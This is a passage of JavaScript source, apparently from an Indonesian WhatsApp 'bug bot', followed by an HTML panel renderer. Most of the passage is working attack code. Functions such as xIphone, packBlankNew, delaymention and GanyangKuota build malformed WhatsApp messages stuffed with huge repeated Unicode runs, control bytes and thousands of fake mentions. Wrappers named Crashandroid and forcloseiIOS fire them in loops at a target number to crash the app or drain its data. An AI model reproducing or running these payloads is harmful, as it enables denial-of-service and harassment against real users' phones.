            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT",
            contextInfo: {
                quotedAd: {
                    advertiserName: "x",
                    mediaType: "IMAGE",
                    jpegThumbnail: "",
                    caption: "x"
                },
                placeholderKey: {
                    remoteJid: "0@s.whatsapp.net",
                    fromMe: false,
                    id: "ABCDEF1234567890"
                }
            }
        };

        const msg = generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: { extendedTextMessage }
            }
        }, {});

        await sock.relayMessage(target, { groupStatusMessageV2: { message: msg.message } },
            { participant: { jid: target } });
    }
};

async function xIphone(sock, target) {
  const sockJmbtMsg = {
    locationMessage: {
      degreesLatitude: 1999-1999917739,
      degreesLongitude: -11.81992828899,
      name: `# ! Fyzz - Ex4s ! ` + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://t.me/kepomeemwk",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "# ! Fyzz - Ex4s ! " + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "0s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  };

  await sock.relayMessage(target, sockJmbtMsg, {
    participant: { jid: target }
  });
  console.log(chalk.red(` Success Attack To: ${target}`));
}

async function uiXV2IOS(target) {
    await sock.relayMessage(target, {
        groupInviteMessage: {
            groupName: "🩸⃟⃨〫⃰‣ ⁖Wkwkkwkw—" + ("𑐶𑐵𑆷𑐷𑆵".repeat(19999)).repeat(2),
            groupJid: '1@g.us',
            inviteCode: 'h+64P9RhJDzgXSPf',
            inviteExpiration: '999',
            caption: "ㅤㅤㅤㅤㅤㅤㅤㅤ",
        }
    }, {})
}

//PACK BLANK ANDROID
async function packBlankNew(sock, target) {
  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "./justin" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "./justin" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🀄"],
            accessibilityLabel: "justinoffc",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "./justin" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}

//DELAY SW
async function delaymention(sock, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: true,
          isAiSticker: true,
          isLottie: true,
        },
      },
    },
  };
  
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "JustinXKoirii",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\x10".repeat(1045000),
                        version: 3
                    },
                   entryPointConversionSource: "galaxy_message",
                }
            }
        }
    }, {
        ephemeralExpiration: 0,
        forwardingScore: 9741,
        isForwarded: true,
        font: Math.floor(Math.random() * 99999999),
        background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    });
    for (let i = 0; i < 100; i++) {
  const janda = generateWAMessageFromContent(target, message, {});

        await sock.relayMessage("status@broadcast", message.message, {
            messageId: message.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });
        
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                { tag: "to", attrs: { jid: target }, content: undefined }
                            ]
                        }
                    ]
                }
            ]
        });
        if (i < 99) {
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
}

//GANYANG KUOTA
async function GanyangKuota(target) {
try {
const justininvis = "\u2063".repeat(4000);
const justin = "\u300B".repeat(3000);

const msg1 = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "justin offc",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(9000),  
          actions: [  
            { name: "galaxy_message", buttonParamsJson: "\u0005".repeat(6000) + justininvis }  
          ],  
          version: 3  
        }  
      }  
    }  
  }  
};  

const msg2 = {  
  stickerMessage: {  
    url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",  
    fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",  
    mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",  
    mimetype: "image/webp",  
    height: 9999,  
    width: 9999,  
    directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw",  
    fileLength: 12260,  
    mediaKeyTimestamp: "1743832131",  
    isAnimated: false,  
    stickerSentTs: "X",  
    isAvatar: false,  
    isAiSticker: false,  
    isLottie: false,  
    contextInfo: {  
      mentionedJid: [  
        "0@s.whatsapp.net",  
        ...Array.from({ length: 1900 }, () =>  
          `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
        )  
      ],  
      stanzaId: "1234567890ABCDEF",  
      quotedMessage: {  
        paymentInviteMessage: {  
          serviceType: 3,  
          expiryTimestamp: Date.now() + 1814400000  
        }  
      }  
    }  
  }  
};  

const msg3 = {  
  viewOnceMessage: {  
    message: {  
      interactiveMessage: {  
        body: {  
          xternalAdReply: {  
            title: "justin",  
            text: justin  
          }  
        },  
        extendedTextMessage: {  
          text: "{".repeat(9000),  
          contextInfo: {  
            mentionedJid: Array.from(  
              { length: 2000 },  
              (_, i) => `1${i}@s.whatsapp.net`  
            )  
          }  
        },  
        businessMessageForwardInfo: {  
          businessOwnerJid: "13135550002@s.whatsapp.net"  
        },  
        nativeFlowMessage: {  
          buttons: [  
            { name: "cta_url", buttonParamsJson: "\u0005".repeat(1000) + salsa },  
            { name: "call_permission_request", buttonParamsJson: "\u0005".repeat(7000) + salsa }  
          ],  
          nativeFlowResponseMessage: {  
            name: "galaxy_message",  
            paramsJson: "\u0000".repeat(7000),  
            version: 3  
          },  
          contextInfo: {  
            mentionedJid: [  
              "0@s.whatsapp.net",  
              ...Array.from(  
                { length: 1900 },  
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`  
              )  
            ]  
          }  
        }  
      }  
    }  
  }  
};  

const msg4 = {  
  viewOnceMessage: {  
    message: {  
      interactiveResponseMessage: {  
        body: {  
          text: "justinoffc",  
          format: "DEFAULT"  
        },  
        nativeFlowResponseMessage: {  
          name: "call_permission_request",  
          paramsJson: "\u0000".repeat(6000),  
          version: 3  
        },  
        contextInfo: {  
          participant: "0@s.whatsapp.net",  
          remoteJid: "status@broadcast",  
          mentionedJid: [  
            "0@s.whatsapp.net",  
            ...Array.from({ length: 1900 }, () =>  
              "1" + Math.floor(Math.random() * 500000).toString(16).padStart(6, "0")  
            )  
          ],  
          quotedMessage: {  
            paymentInviteMessage: {  
              serviceType: 3,  
              expiryTimeStamp: Date.now() + 1690500  
            }  
          }  
        }  
      }  
    }  
  }  
};  

const msg5 = {  
  requestPhoneNumberMessage: {  
    contextInfo: {  
      businessMessageForwardInfo: {  
        businessOwnerJid: "13135550002@s.whatsapp.net"  
      },  
      bimid: "apa an bego" + "p" + Math.floor(Math.random() * 99999),  
      forwardingScore: 100,  
      isForwarded: true,  
      forwardedNewsletterMessageInfo: {  
        newsletterJid: "120363321780349272@newsletter",  
        serverMessageId: 1,  
        newsletterName: "information justin".repeat(1)  
      }  
    }  
  }  
};  

const msg6 = {  
  videoMessage: {  
    url: "https://example.com/video.mp4",  
    mimetype: "video/mp4",  
    fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",  
    fileLength: "1515940",  
    seconds: 14,  
    mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",  
    height: 1280,  
    width: 720,  
    fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",  
    directPath: "/example",  
    mediaKeyTimestamp: "1748276788",  
    contextInfo: {  
      isSampled: true,  
      mentionedJid: typeof mentionedList !== "undefined" ? mentionedList : []  
    }  
  }  
};  

const msg7 = [  
  {  
    ID: "68917910",  
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",  
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",  
    sid: "5e03e0",  
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",  
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",  
    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",  
  },  
  {  
    ID: "68884987",  
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",  
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",  
    sid: "5e03e0",  
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",  
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",  
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",  
  }
]

for (const msg of [msg4, msg5, msg6]) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}  

for (const msg of [msg1, msg2, msg3]) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}  

for (const msg of msg7) {  
  await sock.relayMessage("status@broadcast", msg, {  
    messageId: undefined,  
    statusJidList: [target],  
    additionalNodes: [  
      {  
        tag: "meta",  
        attrs: {},  
        content: [  
          {  
            tag: "mentioned_users",  
            attrs: {},  
            content: [{ tag: "to", attrs: { jid: target } }]  
          }  
        ]  
      }  
    ]  
  });  
}

console.log(`GanyangKuota Attacked Sending Bug To ${target} Suksesfull`);

} catch (e) {
console.error(e);
}
}

//DELAY MESSAGE 
async function JustinMessage(sock, target) {
  try {
    const msgContent = proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          lottieStickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
            fileSha256: Buffer.from("ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=", "base64"),
            fileEncSha256: Buffer.from("D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=", "base64"),
            mediaKey: Buffer.from("yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=", "base64"),
            mimetype: "application/was",
            height: 512,
            width: 512,
            directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
            fileLength: "14390",
            mediaKeyTimestamp: "1760786856",
            isAnimated: true,
            stickerSentTs: "1760786855983",
            isAvatar: false,
            isAiSticker: false,
            isLottie: true,
            stickerType: 2, 
            contextInfo: {
              isForwarded: false,
              mentionedJid: []
            }
          }
        }
      }
    });

    const msg = generateWAMessageFromContent(target, msgContent, {});
    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });

    console.log("XHERO SENDING BUG");
  } catch (e) {
    console.error("❌ Function Eror:", e);
  }
}
// ================================================
async function Crashandroid(sock, target) {
     for (let i = 0; i < 20; i++) {
         await ForceBitterSpam(target);
         await ganyangkuota(target);
         await delayinvis(sock, target);
         await JustinMessage(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function ForcloseCall(sock, target) {
     for (let i = 0; i < 20; i++) {
         await ForceBitterSpam(target);
         await ganyangkuota(target);
         await packBlankNew(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }
     
async function DelayHard(sock, target) {
     for (let i = 0; i < 30; i++) {
         await uiXV2IOS(target);
         await xIphone(sock, target);
         await iosinVisFC3(sock, target);
         await NewExtendIOS(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }     
     
async function forcloseiIOS(sock, target) {
     for (let i = 0; i < 30; i++) {
         await uiXV2IOS(target);
         await xIphone(sock, target);
         await iosinVisFC3(sock, target);
         await NewExtendIOS(sock, target);
         }
     console.log(chalk.green(`👀 Success Send Bugs to ${target}`));
     }

// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  userKey = "", // ✅ Parameter untuk key/password
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  const filePath = path.join(__dirname, "Is't The Beast", "!Fyzz.html");

  try {
    let html = fs.readFileSync(filePath, "utf8");

    // Ganti semua placeholder di HTML - URUTAN PENTING!
    html = html
      // 1. Ganti userKey/password terlebih dahulu
      .replace(/\$\{userKey\s*\|\|\s*'Unknown'\}/g, userKey || "Unknown")
      .replace(/\$\{userKey\}/g, userKey || "")
      .replace(/\$\{password\}/g, userKey || "")
      .replace(/\{\{password\}\}/g, userKey || "")
      .replace(/\{\{key\}\}/g, userKey || "")
      .replace(/\$\{key\}/g, userKey || "")
      // 2. Ganti username
      .replace(/\$\{username\s*\|\|\s*'Unknown'\}/g, username || "Unknown")
      .replace(/\$\{username\}/g, username || "Unknown")
      .replace(/\{\{username\}\}/g, username || "Unknown")
      // 3. Ganti yang lainnya
      .replace(/\{\{expired\}\}/g, formattedTime)
      .replace(/\{\{status\}\}/g, status)
      .replace(/\{\{message\}\}/g, message)
      .replace(/\$\{formattedTime\}/g, formattedTime);

    return html;
  } catch (err) {
    console.error("Gagal membaca file !Fyzz.html:", err);
    return `<h1>Gagal memuat halaman</h1>`;
  }
};